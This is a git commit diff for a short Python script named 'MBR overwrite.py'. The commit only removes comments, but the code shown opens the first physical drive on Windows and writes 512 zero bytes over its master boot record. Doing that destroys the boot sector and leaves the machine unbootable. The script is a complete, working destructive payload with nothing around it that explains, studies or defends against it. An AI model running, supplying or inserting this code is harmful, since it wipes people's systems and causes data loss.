c8bbb93459e2209abbd7e4e332c9170627984b3d
Ares Amigos <98190104+AresAmigos@users.noreply.github.com>
2023-01-08 03:02:52 +0100

    Update MBR overwrite.py

--- MBR overwrite.py
+++ MBR overwrite.py
@@ -1,4 +1,4 @@
 from win32file import *
-hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create a handle to our Physical Drive
+hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
 WriteFile(hDevice, AllocateReadBuffer(512), None)
-CloseHandle(hDevice) # Close the handle to Physical Drive
+CloseHandle(hDevice)
